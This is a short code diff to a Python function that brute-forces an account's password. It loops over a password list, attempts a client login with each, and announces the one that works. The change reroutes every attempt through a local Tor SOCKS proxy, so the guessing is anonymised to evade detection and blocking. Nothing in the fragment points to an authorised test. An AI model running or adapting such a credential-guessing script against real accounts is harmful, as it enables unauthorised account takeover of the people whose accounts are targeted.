@@ -31,10 +31,7 @@ def login_with_passwords(username, password_list):
     for pwd in password_list:
         print(f"[+] Trying: {pwd}")
         client = Client()
-        client._session.proxies = {
-            'http': 'socks5h://127.0.0.1:9050',
-            'https': 'socks5h://127.0.0.1:9050'
-        }
+        client.set_proxy('socks5h://127.0.0.1:9050')
         try:
             client.login(username, pwd)
             print(f"[✔️] Success! Password is: {pwd}")
